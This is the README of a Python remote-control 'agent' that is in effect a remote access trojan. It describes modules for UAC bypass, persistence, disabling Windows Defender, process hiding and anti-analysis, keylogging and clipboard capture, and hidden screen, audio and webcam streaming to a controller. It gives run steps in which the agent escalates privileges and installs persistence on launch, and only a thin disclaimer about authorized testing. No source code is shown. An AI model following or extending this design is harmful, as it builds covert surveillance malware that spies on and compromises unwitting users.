# Agent Client - Modular Version

This is a modularized version of the original monolithic `client.py` file, broken down into focused, maintainable modules.

## Project Structure

```
client-chop-version/
├── main.py                    # Main entry point
├── config.py                  # Configuration and constants
├── dependencies.py            # Dependency management and imports
├── logging_utils.py           # Logging utilities
├── uac_bypass.py             # UAC bypass techniques
├── persistence.py            # Persistence mechanisms
├── security.py               # Security and stealth features
├── streaming.py              # Screen/audio/camera streaming
├── input_handler.py          # Remote control and input monitoring
├── file_handler.py           # File upload/download functionality
├── system_monitor.py         # System monitoring and process management
├── socket_client.py          # Socket.IO client communication
├── command_executor.py       # Command execution handler
├── requirements.txt          # Python dependencies
└── README.md                 # This file
```

## Module Descriptions

### Core Modules

- **main.py**: Main entry point that orchestrates all modules and provides the main execution loop
- **config.py**: Contains all configuration constants, settings, and validation functions
- **dependencies.py**: Manages importing and checking availability of all third-party libraries
- **logging_utils.py**: Handles logging configuration and messaging for stealth operation

### Security Modules

- **uac_bypass.py**: Implements various UAC bypass techniques inspired by UACME project
- **persistence.py**: Handles various persistence mechanisms to ensure agent survival
- **security.py**: Implements process hiding, Windows Defender disabling, and anti-analysis features

### Functionality Modules

- **streaming.py**: Handles screen, audio, and camera streaming with modern pipeline architecture
- **input_handler.py**: Manages remote control, keyboard/mouse handling, keylogger, and clipboard monitoring
- **file_handler.py**: Provides file upload/download functionality with chunked transfers
- **system_monitor.py**: System monitoring, process management, and process termination
- **socket_client.py**: Socket.IO client connection and communication with the controller
- **command_executor.py**: Executes commands received from the controller

## Key Features

### Streaming Capabilities
- **Screen Streaming**: High-performance screen capture with H.264 encoding
- **Audio Streaming**: Real-time audio capture and transmission
- **Camera Streaming**: Webcam capture and streaming
- **WebRTC Support**: Low-latency streaming with adaptive quality

### Remote Control
- **Mouse Control**: Remote mouse movement and clicking
- **Keyboard Control**: Remote key presses and combinations
- **Input Monitoring**: Keylogger and clipboard monitoring
- **Voice Control**: Speech recognition for voice commands

### File Management
- **File Transfer**: Chunked file upload/download
- **Directory Browsing**: Remote file system navigation
- **File Operations**: Create, delete, move, copy files and directories

### System Management
- **Process Control**: List, monitor, and terminate processes
- **System Monitoring**: CPU, memory, disk, and network monitoring
- **Privilege Escalation**: Multiple UAC bypass techniques
- **Persistence**: Various persistence mechanisms

### Security Features
- **Stealth Operation**: Process hiding and anti-analysis
- **Defender Bypass**: Windows Defender disabling techniques
- **Tamper Protection**: Self-protection mechanisms
- **Encryption**: Secure communication channels

## Installation

1. Install Python 3.7 or higher
2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

## Configuration

Edit `config.py` to configure:
- Server URL for controller connection
- Email notification settings
- Streaming parameters
- Security settings

## Usage

Run the agent:
```bash
python main.py
```

The agent will:
1. Initialize all components
2. Attempt privilege escalation
3. Setup persistence mechanisms
4. Connect to the controller
5. Start the main execution loop

## Architecture Benefits

### Modularity
- Each module has a single responsibility
- Easy to maintain and extend
- Clear separation of concerns

### Scalability
- Components can be enabled/disabled independently
- Easy to add new features
- Reduced resource usage when features aren't needed

### Maintainability
- Smaller, focused files are easier to understand
- Better error isolation
- Simplified debugging

### Testability
- Individual modules can be tested in isolation
- Mock dependencies for unit testing
- Better code coverage

## Error Handling

The modular design includes comprehensive error handling:
- Graceful degradation when dependencies are missing
- Fallback mechanisms for critical functionality
- Detailed logging for troubleshooting
- Automatic recovery from failures

## Security Considerations

This software contains advanced security techniques and should only be used for:
- Authorized penetration testing
- Security research
- Educational purposes
- Legitimate system administration

**Warning**: Misuse of this software may violate laws and regulations. Users are responsible for ensuring compliance with applicable laws.

## Dependencies

### Required
- python-socketio: Real-time communication
- psutil: System monitoring
- requests: HTTP communication

### Optional (Feature-dependent)
- mss, PIL, opencv-python, numpy: Screen capture and image processing
- PyAudio: Audio capture
- pynput, pyautogui: Input handling
- pywin32: Windows-specific functionality
- aiortc: WebRTC streaming
- SpeechRecognition: Voice control

The agent will gracefully degrade functionality when optional dependencies are missing.

## Performance

The modular design provides several performance benefits:
- Lazy loading of modules reduces startup time
- Independent threads for different services
- Efficient resource management
- Configurable quality settings for streaming

## Future Enhancements

The modular architecture makes it easy to add:
- Additional streaming protocols
- New persistence mechanisms
- Enhanced security features
- Platform-specific optimizations
- Additional communication channels
